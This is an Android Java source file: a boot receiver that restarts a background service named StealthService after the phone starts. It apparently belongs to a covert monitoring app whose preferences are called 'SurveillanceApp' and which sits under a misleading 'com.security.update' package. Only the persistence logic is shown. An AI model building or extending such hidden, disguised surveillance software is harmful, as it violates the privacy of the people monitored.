package com.security.update;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.util.Log;

public class BootReceiver extends BroadcastReceiver {
    private static final String TAG = "BootReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
            SharedPreferences prefs = context.getSharedPreferences("SurveillanceApp", Context.MODE_PRIVATE);
            boolean isVerified = prefs.getBoolean("code_verified", false);
            boolean permissionsGranted = prefs.getBoolean("permissions_granted", false);
            String parentCode = prefs.getString("parent_code", "");

            if (isVerified && permissionsGranted && !parentCode.isEmpty()) {
                // Rudi kwa background service
                Intent serviceIntent = new Intent(context, StealthService.class);
                serviceIntent.putExtra("PARENT_CODE", parentCode);
                
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    context.startForegroundService(serviceIntent);
                } else {
                    context.startService(serviceIntent);
                }
                
                Log.d(TAG, "✅ Service imerudishwa baada ya boot");
            }
        }
    }
}
